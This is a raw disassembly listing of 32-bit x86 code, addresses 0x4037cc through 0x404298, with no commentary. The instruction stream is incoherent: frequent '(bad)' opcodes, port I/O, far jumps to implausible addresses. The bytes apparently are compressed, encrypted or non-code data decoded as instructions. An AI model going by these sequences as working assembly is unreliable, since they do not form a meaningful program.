  4037cc:	lea    eax,[edx+0x5c39a37a]
  4037d2:	(bad)  
  4037d3:	mov    ?,ecx
  4037d5:	inc    ebx
  4037d6:	mov    ds:0x9bfd04fb,eax
  4037dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037dd:	inc    eax
  4037de:	ss pop ebx
  4037e0:	add    cl,ch
	...
  40380a:	add    BYTE PTR [eax],al
  40380c:	cmp    eax,0x2624c75b
  403811:	pop    ebx
  403812:	add    cl,ch
  403814:	cmp    eax,0xc4f155d0
  403819:	dec    eax
  40381a:	lea    ebp,[ebp+eax*1+0x8e86a0b]
  403821:	es cld 
  403823:	inc    esi
  403824:	outs   dx,BYTE PTR ds:[esi]
  403825:	mov    ds:0x9c45b4ff,eax
  40382a:	push   edx
  40382b:	(bad)  
  40382d:	and    eax,0x9bbc4108
  403832:	jmp    DWORD PTR [esi]
  403834:	ins    DWORD PTR es:[edi],dx
  403835:	rcl    BYTE PTR [ebp-0xf],1
  403838:	les    ecx,FWORD PTR [eax+0x6a]
  40383b:	jmp    0x953f9397
  403840:	leave  
  403841:	fwait
  403842:	jne    0x403845
  403844:	mov    al,0x25
  403846:	or     dh,bh
  403848:	push   cs
  403849:	inc    edi
  40384a:	pop    eax
  40384b:	bound  ecx,QWORD PTR [esi]
  40384d:	mov    ds:0x60399403,eax
  403852:	rcr    BYTE PTR [edi-0x68],1
  403855:	jo     0x403817
  403857:	mov    al,0x7c
  403859:	push   edx
  40385a:	add    BYTE PTR [ecx-0x16ffa4c3],dl
  403860:	je     0x4037fa
  403862:	or     cl,ch
  403864:	or     al,dl
  403866:	in     al,dx
  403867:	push   0x7e
  403869:	sahf   
  40386a:	push   eax
  40386b:	adc    edx,ebx
  40386d:	pop    edi
  40386e:	adc    DWORD PTR [ecx],ebp
	...
  403898:	add    BYTE PTR [eax],al
  40389a:	cmp    ah,BYTE PTR [ebx-0x6481178e]
  4038a0:	call   DWORD PTR [edx+ebp*1]
  4038a3:	pushf  
  4038a4:	jne    0x403887
  4038a6:	push   ebp
  4038a7:	dec    DWORD PTR es:[esi+0xc04f4b]
  4038ae:	cmp    bl,BYTE PTR [ebx+0x5f23c2c8]
  4038b4:	mov    edx,DWORD PTR [ebp+0x1f]
  4038b7:	in     al,0x12
  4038b9:	lea    ebx,[edx-0x6d]
  4038bc:	push   eax
  4038bd:	(bad)  
  4038be:	cli    
  4038bf:	outs   dx,BYTE PTR ds:[esi]
  4038c0:	push   DWORD PTR [ebp+0x23]
  4038c3:	nop
  4038c4:	jne    0x4038ce
  4038c6:	jo     0x4038f5
  4038c8:	or     al,0x85
  4038ca:	push   edi
  4038cb:	pop    ss
  4038cc:	adc    ecx,DWORD PTR [ebx+0x453b92aa]
  4038d2:	pop    ss
  4038d3:	or     al,BYTE PTR [edi]
  4038d5:	mov    eax,0x5ed6
  4038da:	jl     0x403875
  4038dc:	sub    al,al
  4038de:	sub    al,0x5d
  4038e0:	sub    eax,eax
  4038e2:	push   cs
  4038e3:	popf   
  4038e4:	or     al,0x0
  4038e6:	mov    ah,bl
  4038e8:	in     al,dx
  4038e9:	sbb    DWORD PTR [ebx],0xffffff93
  4038ec:	push   esi
  4038ed:	push   eax
  4038ee:	fild   WORD PTR [esi]
  4038f0:	xchg   ebx,eax
  4038f1:	adc    edi,esp
  4038f3:	pop    esi
  4038f4:	clc    
  4038f5:	jb     0x40388d
  4038f7:	fwait
  4038f8:	inc    DWORD PTR [ebx+0x74006212]
	...
  403926:	add    BYTE PTR [eax],al
  403928:	test   eax,0xa7087ddb
  40392d:	or     DWORD PTR [edi],eax
  40392f:	sub    edx,edi
  403931:	xor    cl,cl
  403933:	ret    0x5e63
  403936:	cmp    DWORD PTR [ebp-0x69],0x5e
  40393a:	jne    0x403946
  40393c:	mov    edi,0x5700005d
  403941:	xor    cl,cl
  403943:	ret    0x5e83
  403946:	mov    esi,DWORD PTR [ebp+0x53]
  403949:	xlat   BYTE PTR ds:[ebx]
  40394a:	inc    ebp
  40394b:	cld    
  40394c:	addr16 pop esi
  40394e:	add    BYTE PTR [eax],al
  403950:	ds std 
  403952:	dec    ebp
  403953:	or     BYTE PTR [ebp+0x3a458696],dh
  403959:	je     0x403950
  40395b:	jne    0x4039ab
  40395d:	jb     0x403954
  40395f:	jne    0x403997
  403961:	adc    DWORD PTR [ecx+0x10],edx
  403964:	mov    ebx,0x65077ac3
  403969:	inc    esp
  40396a:	push   ebp
  40396b:	leave  
  40396c:	cld    
  40396d:	xchg   DWORD PTR [ebx],eax
  40396f:	or     DWORD PTR [ebx+0x39750330],0x5d
  403976:	les    ebx,FWORD PTR [esi+0x7]
  403979:	inc    esi
  40397a:	pop    es
  40397b:	add    ch,al
  40397d:	mov    esi,0x5aee03f7
  403982:	aas    
  403983:	adc    BYTE PTR [ebx+0x40],ch
  403986:	mov    ebx,0x3843e01
  40398b:	pop    esi
	...
  4039b4:	add    BYTE PTR [eax],al
  4039b6:	pop    es
  4039b7:	inc    esi
  4039b8:	pop    es
  4039b9:	add    BYTE PTR [ebx-0x3],dh
  4039bc:	out    0x81,al
  4039be:	cli    
  4039bf:	imul   esp,esp,0xffffffff
  4039c2:	mov    ecx,0x4a685bf3
  4039c7:	mov    dh,0x43
  4039c9:	add    BYTE PTR [esi-0x5e3cfdeb],ah
  4039cf:	fld    QWORD PTR [ebx]
  4039d1:	push   0x3e
  4039d3:	cs pop es
  4039d5:	push   0x3e
  4039d7:	cs pop es
  4039d9:	push   0x8003843e
  4039de:	sub    DWORD PTR [esi],0xd32de7fc
  4039e4:	add    al,0x0
  4039e6:	(bad)  
  4039e7:	ds lock inc eax
  4039ea:	xrelease xchg DWORD PTR [edx+eax*8+0x5d8436],edi
  4039f2:	retf   
  4039f3:	pop    edx
  4039f4:	sub    al,0xec
  4039f6:	out    dx,al
  4039f7:	add    ch,cl
  4039f9:	adc    edi,DWORD PTR [esi]
  4039fb:	pop    ebx
  4039fc:	mov    DWORD PTR fs:[esi-0x77],eax
  403a00:	mov    ?,ebx
  403a02:	mov    ds,WORD PTR [eax+0x6f26effc]
  403a08:	js     0x403a0e
  403a0a:	ds fs test eax,0xf4983079
  403a11:	out    dx,eax
  403a12:	imul   ebx,DWORD PTR es:[eax+0x4],0xbd29443e
	...
  403a42:	add    BYTE PTR [eax],al
  403a44:	cld    
  403a45:	arpl   cx,bp
  403a47:	repnz mov edx,DWORD PTR [ebx-0x770976a4]
  403a4e:	inc    esi
  403a4f:	repz mov ds,WORD PTR [eax+0x66e1ffb4]
  403a56:	ss repz loope 0x403a36
  403a5a:	lods   al,BYTE PTR ds:[esi]
  403a5b:	jmp    0x403a9b
  403a5d:	push   cs
  403a5e:	gs repz dec ebx
  403a61:	xchg   edi,eax
  403a62:	adc    ebp,ebx
  403a64:	into   
  403a65:	pop    ebx
  403a66:	jmp    0xe99b7a16
  403a6b:	add    eax,DWORD PTR [edi+0xb03f19d]
  403a71:	in     al,0xd
  403a73:	push   esp
  403a74:	push   es
  403a75:	add    edx,DWORD PTR [eax+0x16]
  403a78:	(bad)  
  403a79:	pop    edx
  403a7a:	icebp  
  403a7b:	jne    0x403abc
  403a7d:	pushf  
  403a7e:	out    0x5d,al
  403a80:	cmp    al,0x5
  403a82:	jmp    0xc1a34e79
  403a87:	xchg   ecx,eax
  403a88:	sbb    DWORD PTR [eax+0x5f7cbcce],0xffffffe9
  403a8f:	pop    eax
  403a90:	lds    eax,FWORD PTR [edi-0x2d29b3e7]
  403a96:	add    bl,bl
  403a98:	std    
  403a99:	pop    edx
  403a9a:	clc    
  403a9b:	cmp    eax,DWORD PTR [ebx-0x64]
  403a9e:	call   DWORD PTR [ebx]
  403aa0:	cmp    al,BYTE PTR ds:0x62c69e00
  403aa6:	call   0x403ac1
	...
  403acf:	add    BYTE PTR [eax],al
  403ad1:	add    BYTE PTR [edi-0x68],cl
  403ad4:	jmp    DWORD PTR [eax+0x1c005f03]
  403ada:	mov    cl,0x87
  403adc:	and    DWORD PTR [ebp+0x1582b15],0xfffffff0
  403ae3:	ins    BYTE PTR es:[edi],dx
  403ae4:	inc    eax
  403ae5:	jmp    0x2a41480f
  403aea:	or     al,0x98
  403aec:	jne    0x403adb
  403aee:	mov    esp,0x762ef81d
  403af3:	xchg   edi,eax
  403af4:	add    cl,ch
  403af6:	cmp    eax,0xece96a5b
  403afb:	or     eax,0x63663e0c
  403b00:	call   0xffd829ab
  403b05:	bound  esi,QWORD PTR [esi+0x63]
  403b08:	mov    edi,ebx
  403b0a:	int3   
  403b0b:	or     eax,0x93461efc
  403b10:	call   FWORD PTR [ebp+eax*8-0x50ead68]
  403b17:	pushf  
  403b18:	or     cl,ch
  403b1a:	push   ss
  403b1b:	in     al,0xec
  403b1d:	cdq    
  403b1e:	cmc    
  403b1f:	add    bl,BYTE PTR [eax]
  403b21:	(bad)  
  403b23:	pop    edx
  403b24:	clc    
  403b25:	jnp    0x403b69
  403b27:	pushf  
  403b28:	call   DWORD PTR [ebx+0x3a]
  403b2b:	cwde   
  403b2c:	jne    0x403b1f
  403b2e:	gs sar bh,0xd6
  403b32:	(bad)  
  403b33:	mov    eax,ds:0xe5c2
	...
  403b60:	cmp    eax,0x8b008b2e
  403b65:	adc    eax,0x48d41455
  403b6a:	add    BYTE PTR [ebp+0x53],dh
  403b6d:	aam    0xc2
  403b6f:	adc    BYTE PTR [edi-0x76],ah
  403b72:	jne    0x403b84
  403b74:	cwde   
  403b75:	(bad)  
  403b77:	push   DWORD PTR [edx]
  403b79:	xchg   edi,eax
  403b7a:	out    0xe6,eax
  403b7c:	stos   BYTE PTR es:[edi],al
  403b7d:	mov    edi,edi
  403b7f:	mov    esi,DWORD PTR [edx+0x73]
  403b82:	and    DWORD PTR [edx],eax
  403b84:	out    dx,al
  403b85:	popf   
  403b86:	adc    BYTE PTR [eax],al
  403b88:	push   edx
  403b89:	sbb    ah,ch
  403b8b:	adc    ebx,0xffffff8b
  403b8e:	push   DWORD PTR [ebp-0x5]
  403b91:	cmp    BYTE PTR [ecx*4-0xaf791e],al
  403b98:	repnz xchg edx,eax
  403b9a:	out    0xc3,eax
  403b9c:	push   0xa28bff8c
  403ba1:	xchg   esi,eax
  403ba2:	cmp    BYTE PTR [eax],0xe7
  403ba5:	push   cs
  403ba6:	pop    es
  403ba7:	mov    esp,DWORD PTR [edx+0x7cc80f86]
  403bad:	pop    ebp
  403bae:	sub    eax,eax
  403bb0:	push   ds
  403bb1:	popf   
  403bb2:	or     BYTE PTR [eax],al
  403bb4:	xchg   edx,eax
  403bb5:	pop    ss
  403bb6:	in     al,dx
  403bb7:	and    DWORD PTR [ebx],0xffffff8b
  403bba:	push   DWORD PTR [ebp-0x25]
  403bbd:	cmp    BYTE PTR [edx],al
  403bbf:	(bad)  
  403bc0:	loop   0x403b4e
  403bc2:	push   eax
  403bc3:	inc    DWORD PTR [eax]
	...
  403bed:	add    BYTE PTR [edx],dh
  403bef:	xchg   edx,eax
  403bf0:	out    0x97,eax
  403bf2:	test   al,0x8b
  403bf4:	dec    DWORD PTR [ebx+0x388296d2]
  403bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bfb:	push   cs
  403bfc:	or     BYTE PTR [edi],cl
  403bfe:	mov    al,0x1d
  403c00:	inc    BYTE PTR [esi+0x2b02b7e3]
  403c06:	les    edi,FWORD PTR ds:[edx+0x568446c2]
  403c0d:	mov    esp,DWORD PTR [edx+0x1]
  403c10:	(bad)  
  403c11:	cld    
  403c12:	imul   ecx,DWORD PTR [edi+0x0],0x45ff3f6a
  403c19:	(bad)  
  403c1a:	out    dx,al
  403c1b:	les    esi,FWORD PTR [esi+0x8]
  403c1e:	pushw  0xfff1
  403c21:	dec    DWORD PTR [ecx+0x9]
  403c24:	inc    esi
  403c25:	or     al,0xbd
  403c27:	lods   al,BYTE PTR ds:[esi]
  403c28:	add    esi,DWORD PTR [eax+eax*2-0x4b]
  403c2c:	mov    ecx,0x5e93145
  403c31:	sub    edi,esi
  403c33:	retf   0x8c5
  403c36:	ds ja  0x403cb6
  403c39:	in     al,dx
  403c3a:	lds    ebp,FWORD PTR [esi+0x14]
  403c3d:	adc    DWORD PTR [esp+eax*4+0x76],0x4
  403c42:	test   DWORD PTR [ecx-0x1],0xffb700ff
  403c49:	(bad)  
  403c4a:	jae    0x403cc8
  403c4c:	fcmovnbe st,st(0)
  403c4e:	repnz sbb al,0xf0
  403c51:	or     eax,DWORD PTR [eax]
	...
  403c7b:	add    dh,bh
  403c7d:	into   
  403c7e:	cld    
  403c7f:	mov    cl,BYTE PTR [ebx+0x3e02c8b4]
  403c85:	test   BYTE PTR [ebx],al
  403c87:	add    ch,ah
  403c89:	mov    ds,WORD PTR [ebp+0x1]
  403c8c:	leave  
  403c8d:	out    dx,al
  403c8e:	(bad)  
  403c8f:	dec    BYTE PTR [ebx+0x7c]
  403c92:	fstp   TBYTE PTR ds:0xc9f064ba
  403c98:	jl     0x403c29
  403c9a:	add    edx,DWORD PTR [ebp-0x4b]
  403c9d:	addr16 test ah,al
  403ca0:	mov    ds:0x4a757cf5,al
  403ca5:	fiadd  DWORD PTR [ebx]
  403ca7:	(bad)  
  403ca8:	sti    
  403ca9:	pop    edx
  403caa:	in     eax,0x54
  403cac:	mov    DWORD PTR [edi],ecx
  403cae:	stc    
  403caf:	push   ebp
  403cb0:	or     DWORD PTR [edi],0x8604dbe1
  403cb6:	jmp    0x3ddb81be
  403cbb:	push   es
  403cbc:	mov    ebp,0xeb04bd17
  403cc1:	pop    ebp
  403cc2:	add    al,ah
  403cc4:	clc    
  403cc5:	mov    ds:0xe23e00ab,eax
  403cca:	sub    al,0xf0
  403ccc:	cmp    eax,0x2e48d08b
  403cd1:	adc    BYTE PTR [edx-0x16a4c054],bh
  403cd7:	add    edx,DWORD PTR [eax+0x3e00aba2]
  403cdd:	cs jb  0x403cc0
	...
  403d08:	add    BYTE PTR [eax],al
  403d0a:	mov    edi,0x19eef19f
  403d0f:	xchg   ebp,eax
  403d10:	sbb    bl,BYTE PTR [ebx]
  403d12:	cmc    
  403d13:	add    ecx,ebp
  403d15:	pop    ecx
  403d16:	ds add ebx,ebp
  403d19:	pop    ecx
  403d1a:	ds add edx,ebp
  403d1d:	pop    ebx
  403d1e:	ds pop ebx
  403d20:	jmp    0xf54f2ee8
  403d25:	fucomi st,st(6)
  403d27:	test   ecx,ebp
  403d29:	add    esi,DWORD PTR [edi+0x5244351e]
  403d2f:	sub    BYTE PTR [esi],ch
  403d31:	jns    0x403d79
  403d33:	adc    esp,0xffffffed
  403d36:	leave  
  403d37:	xchg   esp,eax
  403d38:	es dec ecx
  403d3a:	(bad)  
  403d3b:	pop    ebx
  403d3c:	jmp    0xb5207b44
  403d41:	sti    
  403d42:	les    ebp,FWORD PTR [ecx+0x74]
  403d45:	dec    ecx
  403d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d47:	sub    edx,DWORD PTR [ecx+0x5b3e83]
  403d4d:	jmp    0xeeb91c10
  403d52:	mov    al,ds:0x6e65094
  403d57:	arpl   di,di
  403d59:	cmp    edi,DWORD PTR [esi]
  403d5b:	fdivr  DWORD PTR [ebp-0x2f]
  403d5e:	cmp    eax,0x952a030e
  403d63:	jae    0x403d64
  403d65:	cmp    al,0x5a
  403d67:	out    0x85,al
  403d69:	inc    ecx
  403d6a:	push   ecx
  403d6b:	xchg   esp,eax
  403d6c:	call   FWORD PTR [ecx]
	...
  403d96:	add    BYTE PTR [eax],al
  403d98:	imul   ecx,DWORD PTR [esi],0x93eac1fc
  403d9e:	jmp    DWORD PTR [esi-0x148b2bbc]
  403da4:	fs (bad) 
  403da6:	call   FWORD PTR [esi+ebp*1]
  403da9:	and    DWORD PTR [ebx-0x74a4c281],0xffffffaa
  403db0:	je     0x403d54
  403db2:	ret    0x3df1
  403db5:	mov    eax,DWORD PTR cs:[ebp+0x6ef89ebc]
  403dbc:	xchg   esi,eax
  403dbd:	addr16 call 0xffd4524c
  403dc3:	jo     0x403e3b
  403dc5:	xchg   ebx,eax
  403dc6:	(bad)  
  403dc7:	lods   al,BYTE PTR ds:[esi]
  403dc8:	jmp    0x3e293e27
  403dcd:	xchg   esp,eax
  403dce:	jne    0x403dc5
  403dd0:	add    eax,0xd03efdd0
  403dd5:	fist   WORD PTR [ebp-0x1b]
  403dd8:	push   esp
  403dd9:	imul   ebp,DWORD PTR [edx-0x17],0x9cff5b77
  403de0:	fst    DWORD PTR [ebx+0xdd02175]
  403de6:	or     BYTE PTR [esi],dl
  403de8:	ss addr16 (bad) 
  403deb:	mov    ebx,0xc2a241
  403df0:	scas   eax,DWORD PTR es:[edi]
  403df1:	push   edi
  403df2:	push   ebp
  403df3:	mov    esi,DWORD PTR [ebx]
  403df5:	fld    st(4)
  403df7:	clc    
  403df8:	push   0xf823
	...
  403e25:	add    BYTE PTR [edi+0x5ac70057],ah
  403e2b:	mov    eax,DWORD PTR [eax]
  403e2d:	add    BYTE PTR [edi+0x5f558b57],dl
  403e33:	adc    dl,BYTE PTR [edx]
  403e35:	lea    ebx,[edx]
  403e37:	xchg   DWORD PTR [eax+0x6a],edx
  403e3a:	push   esi
  403e3b:	xchg   BYTE PTR [ebp-0x4],dh
  403e3e:	mov    al,ds:0x1afff80b
  403e43:	xchg   edi,eax
  403e44:	(bad)  
  403e45:	push   edx
  403e46:	imul   edx,DWORD PTR [edx],0x45
  403e49:	clc    
  403e4a:	mov    ds,WORD PTR [eax+0x120a0004]
  403e50:	in     al,dx
  403e51:	push   0x26
  403e53:	adc    al,BYTE PTR [ebp+0xc]
  403e56:	ja     0x403dd8
  403e58:	jne    0x403e62
  403e5a:	iret   
  403e5b:	dec    esp
  403e5c:	cld    
  403e5d:	jmp    DWORD PTR [eax+0x2708c2d6]
  403e63:	sub    cl,BYTE PTR [ebx-0x729cc214]
  403e69:	inc    ebp
  403e6a:	adc    ebp,DWORD PTR [edi]
  403e6c:	push   DWORD PTR [ebp+0xf]
  403e6f:	mov    bh,0x1e
  403e71:	cld    
  403e72:	nop
  403e73:	or     cl,0xc2
  403e76:	fistp  WORD PTR [esi+0x55]
  403e79:	mov    edx,DWORD PTR [ebx-0x28f38224]
  403e7f:	or     dl,BYTE PTR [ebx+eax*4]
  403e82:	xchg   edx,eax
  403e83:	outs   dx,BYTE PTR ds:[esi]
  403e84:	add    BYTE PTR [ecx+esi*8+0x7f],dh
  403e88:	jne    0x403e9a
	...
  403eb2:	add    BYTE PTR [eax],al
  403eb4:	and    BYTE PTR [edx],cl
  403eb6:	or     al,0xff
  403eb8:	stos   BYTE PTR es:[edi],al
  403eb9:	xchg   esi,eax
  403eba:	out    0xfd,eax
  403ebc:	ds ins DWORD PTR es:[edi],dx
  403ebe:	in     eax,dx
  403ebf:	inc    DWORD PTR [edi+0x13000046]
  403ec5:	or     eax,0xb42bffe0
  403eca:	in     al,dx
  403ecb:	jne    0x403f13
  403ecd:	pop    esp
  403ece:	mov    al,0xff
  403ed0:	xchg   ecx,eax
  403ed1:	add    DWORD PTR [eax+0x77842e7d],0x2fbd14
  403edb:	add    dl,dh
  403edd:	jns    0x403ecb
  403edf:	jne    0x403f2f
  403ee1:	mov    eax,ds:0x4f690c76
  403ee6:	cld    
  403ee7:	out    0xa9,eax
  403ee9:	shr    esp,1
  403eeb:	inc    DWORD PTR [edi-0x1500003a]
  403ef1:	cld    
  403ef2:	fiadd  WORD PTR [ebx+0x740387cb]
  403ef8:	xor    al,0xf1
  403efa:	jbe    0x403f08
  403efc:	es fiadd WORD PTR ss:[eax]
  403f00:	fld    QWORD PTR ds:[ecx]
  403f03:	sub    edi,esi
  403f05:	jae    0x403ef4
  403f07:	jne    0x403f3b
  403f09:	adc    DWORD PTR [esi+0x8],esi
  403f0c:	es push ebp
  403f0e:	in     al,dx
  403f0f:	call   DWORD PTR [ecx]
  403f11:	mov    ebx,0xcf3e08c1
  403f16:	js     0x403f04
	...
  403f40:	add    BYTE PTR [eax],al
  403f42:	add    DWORD PTR [edi+0x2921e7fb],esp
  403f48:	in     al,dx
  403f49:	dec    DWORD PTR [esi-0x70980462]
  403f4f:	int3   
  403f50:	inc    edx
  403f51:	add    cl,ah
  403f53:	(bad)  
  403f54:	sti    
  403f55:	out    0x4d,eax
  403f57:	dec    ecx
  403f58:	in     al,dx
  403f59:	jmp    DWORD PTR [esp+eax*4-0x14]
  403f5d:	jne    0x403f95
  403f5f:	pop    ebx
  403f60:	adc    DWORD PTR [edi-0x3f],edx
  403f63:	xchg   ecx,eax
  403f64:	push   ds
  403f65:	pop    ecx
  403f66:	cmp    al,0xe0
  403f68:	lods   al,BYTE PTR ds:[esi]
  403f69:	inc    DWORD PTR [ecx]
  403f6b:	xchg   edx,eax
  403f6c:	xchg   esp,eax
  403f6d:	sti    
  403f6e:	mov    eax,ds:0xa1ec0635
  403f73:	add    al,0xeb
  403f75:	jle    0x403f7a
  403f77:	imul   ebx,DWORD PTR [ecx+0x1630bec],0x3e
  403f7e:	mov    DWORD PTR [ecx-0x6388b31a],edx
  403f84:	in     eax,dx
  403f85:	add    edx,DWORD PTR [ebx]
  403f87:	out    0xc5,al
  403f89:	xchg   DWORD PTR [edx-0x72],edi
  403f8c:	into   
  403f8d:	jno    0x403fc5
  403f8f:	sbb    DWORD PTR [ecx],0xffffffee
  403f92:	popa   
  403f93:	xchg   ecx,eax
  403f94:	adc    al,BYTE PTR [ecx+0x4a]
  403f97:	in     al,0x2c
  403f99:	call   0xfc1d575b
  403f9e:	xlat   BYTE PTR ds:[ebx]
  403f9f:	pop    edx
  403fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa1:	jno    0x403fd5
  403fa3:	xchg   edx,eax
  403fa4:	adc    al,0xfc
	...
  403fce:	add    BYTE PTR [eax],al
  403fd0:	and    DWORD PTR [ebx+edx*4-0x15],ebx
  403fd4:	xor    DWORD PTR [ecx+0x729e814],edx
  403fda:	icebp  
  403fdb:	fstp   TBYTE PTR ds:0x19eb7e90
  403fe1:	pop    es
  403fe2:	loope  0x403fbf
  403fe4:	dec    edx
  403fe5:	(bad)  
  403fe6:	outs   dx,BYTE PTR ds:[esi]
  403fe7:	jmp    0x403f9e
  403fe9:	push   ss
  403fea:	gs mov ebp,0x50e963fc
  403ff0:	lds    edi,FWORD PTR [edi+0x6a]
  403ff3:	shr    dl,0x98
  403ff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff7:	out    dx,eax
  403ff8:	ds pop ebx
  403ffa:	jmp    0x3d56f302
  403fff:	push   esp
  404000:	fld    DWORD PTR [esi]
  404002:	add    cl,ah
  404004:	cmc    
  404005:	cmp    esi,ebp
  404007:	jmp    0xa2011649
  40400c:	es nop
  40400e:	jne    0x404001
  404010:	xchg   ebp,eax
  404011:	xchg   ebp,eax
  404012:	stc    
  404013:	push   ss
  404014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404015:	loop   0x40405c
  404017:	adc    DWORD PTR [ebp-0x7aee03fa],edx
  40401d:	jg     0x40401f
  40401f:	jmp    0xdfb510bc
  404024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404025:	push   es
  404026:	clc    
  404027:	cdq    
  404028:	jmp    0x404084
  40402a:	call   0x9b7f87
  40402f:	jo     0x40402f
  404031:	xchg   bh,bh
  404033:	pop    esp
	...
  40405c:	add    BYTE PTR [eax],al
  40405e:	sbb    bx,0xffbd
  404062:	cmp    eax,0x623cff5b
  404067:	js     0x404044
  404069:	ret    0x9064
  40406c:	mov    ebp,DWORD PTR [esi+ecx*2]
  40406f:	pusha  
  404070:	enter  0x6db6,0x2b
  404074:	call   FWORD PTR [edx+eax*2]
  404077:	js     0x40400b
  404079:	lahf   
  40407a:	and    al,0x90
  40407c:	leave  
  40407d:	stos   DWORD PTR es:[edi],eax
  40407e:	xor    DWORD PTR [eax-0x23ee9dac],edx
  404084:	les    edi,FWORD PTR [ecx-0x4]
  404087:	adc    eax,0x5b3de9f4
  40408c:	add    BYTE PTR [esi+edi*2-0x71],ah
  404090:	push   eax
  404091:	outs   dx,BYTE PTR ds:[esi]
  404092:	mov    fs,WORD PTR [ebx-0x18]
  404095:	sub    esi,esp
  404097:	pop    edx
  404098:	add    BYTE PTR [ebp+edi*8+0x12],ah
  40409c:	dec    ebp
  40409d:	push   esi
  40409e:	outs   dx,BYTE PTR ds:[esi]
  40409f:	arpl   ax,bp
  4040a1:	jne    0x40407d
  4040a3:	(bad)  
  4040a4:	inc    DWORD PTR [eax]
  4040a6:	outs   dx,BYTE PTR ds:[esi]
  4040a7:	sbb    edi,eax
  4040a9:	sbb    DWORD PTR [edx+0x3b720483],0xffffffd8
  4040b0:	ins    DWORD PTR es:[edi],dx
  4040b1:	clc    
  4040b2:	jecxz  0x404038
  4040b4:	jne    0x4040b2
  4040b6:	das    
  4040b7:	add    eax,0x90a700ec
  4040bc:	mov    edi,0x75849574
  4040c1:	clc    
	...
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	out    0x2d,eax
  4040ee:	add    al,ch
  4040f0:	xchg   esi,eax
  4040f1:	pop    edx
  4040f2:	add    BYTE PTR [eax],al
  4040f4:	test   al,0xd3
  4040f6:	not    eax
  4040f8:	push   ds
  4040f9:	sbb    esi,esp
  4040fb:	call   DWORD PTR [edx]
  4040fd:	js     0x4040e7
  4040ff:	imul   edx,DWORD PTR [bp+0x0],0xffffffeb
  404104:	jno    0x404088
  404106:	jne    0x404110
  404108:	jg     0x404139
  40410a:	sti    
  40410b:	(bad)  
  40410c:	js     0x40417b
  40410e:	ror    cl,0x95
  404111:	pop    edx
  404112:	add    bl,ch
  404114:	popa   
  404115:	outs   dx,BYTE PTR ds:[esi]
  404116:	ror    cl,0xa5
  404119:	pop    edx
  40411a:	add    BYTE PTR [edx+0x55],ch
  40411d:	sub    eax,0x8f22fffc
  404122:	out    0x4,eax
  404124:	fiadd  WORD PTR [edi+edi*8+0x18762c7]
  40412b:	add    BYTE PTR [edi],dl
  40412d:	pop    ebx
  40412e:	lea    eax,[ebp-0x59]
  404131:	daa    
  404132:	push   DWORD PTR [ebp+0xf]
  404135:	mov    bl,0xfa
  404137:	sti    
  404138:	mov    BYTE PTR [ebx+eax*4+0x7457877d],al
  40413f:	adc    cl,BYTE PTR [eax]
  404141:	sar    DWORD PTR [ebx],cl
  404143:	inc    ebp
  404144:	xchg   ebx,eax
  404145:	inc    BYTE PTR [esi]
  404147:	mov    eax,0x3833e
  40414c:	sbb    DWORD PTR ds:[edx],eax
  40414f:	sub    eax,DWORD PTR [eax]
	...
  404179:	add    dh,bh
  40417b:	sub    DWORD PTR [esi],eax
  40417d:	sub    edi,esi
  40417f:	dec    ebx
  404180:	mov    BYTE PTR [esi+edi*1],0xef
  404184:	jl     0x404172
  404186:	mov    ebp,0x7b8dec38
  40418b:	cmp    BYTE PTR [edi+edi*8+0x33],dl
  40418f:	mov    ebx,ds
  404191:	sbb    ah,BYTE PTR [ebx+0x7e850384]
  404197:	in     al,dx
  404198:	sbb    al,0xff
  40419a:	sub    ecx,DWORD PTR [ebx+ebx*8-0x17726912]
  4041a1:	mov    ebx,edi
  4041a3:	mov    ebp,eax
  4041a5:	jne    0x404131
  4041a7:	pop    esp
  4041a8:	in     eax,0xeb
  4041aa:	ds test ah,bh
  4041ad:	mov    edi,0x75e887f2
  4041b2:	inc    edx
  4041b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b4:	outs   dx,BYTE PTR ds:[esi]
  4041b5:	clc    
  4041b6:	push   cs
  4041b7:	pushf  
  4041b8:	or     edi,DWORD PTR cs:[esi]
  4041bb:	test   al,ch
  4041bd:	jne    0x404219
  4041bf:	lods   al,BYTE PTR ds:[esi]
  4041c0:	shr    bl,cl
  4041c2:	ds test al,ch
  4041c5:	jne    0x4041fd
  4041c7:	pushf  
  4041c8:	sar    dl,cl
  4041ca:	inc    ecx
  4041cb:	mov    ch,0xba
  4041cd:	ret    0x8446
  4041d0:	dec    esi
  4041d1:	mov    esp,DWORD PTR [edx]
  4041d3:	add    DWORD PTR [edi-0x33667218],edi
  4041d9:	lea    edi,[ebx-0x28]
  4041dc:	push   ebx
  4041dd:	inc    DWORD PTR [eax]
	...
  404207:	add    BYTE PTR [ebx+0x22cadb8c],dl
  40420d:	test   BYTE PTR [ebx],al
  40420f:	test   esi,edi
  404211:	lods   al,BYTE PTR ds:[esi]
  404212:	jnp    0x4041cb
  404214:	ds pop ebx
  404216:	jmp    0xf1483b1e
  40421b:	fcmovnbe st,st(4)
  40421d:	xchg   edx,eax
  40421e:	push   esi
  40421f:	call   0xe89559db
  404224:	imul   ecx,DWORD PTR [edi+0x5ae57851],0xffffffe9
  40422b:	cld    
  40422c:	xchg   ecx,eax
  40422d:	pop    ebp
  40422e:	ins    DWORD PTR es:[edi],dx
  40422f:	xchg   DWORD PTR [esi],edi
  404231:	pop    ebx
  404232:	jmp    0x26cbbdb1
  404237:	outs   dx,BYTE PTR ds:[esi]
  404238:	mov    dl,0x82
  40423a:	jnp    0x404240
  40423c:	aas    
  40423d:	pop    ebx
  40423e:	push   0xffffffbf
  404240:	inc    edx
  404241:	pop    eax
  404242:	jmp    0x999b504a
  404247:	(bad)  
  404249:	pop    edx
  40424a:	jmp    0x5580952
  40424f:	call   0x6841c967
  404254:	cmp    eax,0x8282e95c
  404259:	push   esi
  40425a:	in     al,0x3
  40425c:	ds imul ebp,ecx,0x53
  404260:	push   esi
  404261:	jmp    0xdc2c:0xe43e03e9
  404268:	in     al,0x5a
  40426a:	mov    esi,0x71
	...
  404293:	add    BYTE PTR [eax],al
  404295:	add    BYTE PTR [edx-0x73],ah
  404298:	cmp    al,0xf0
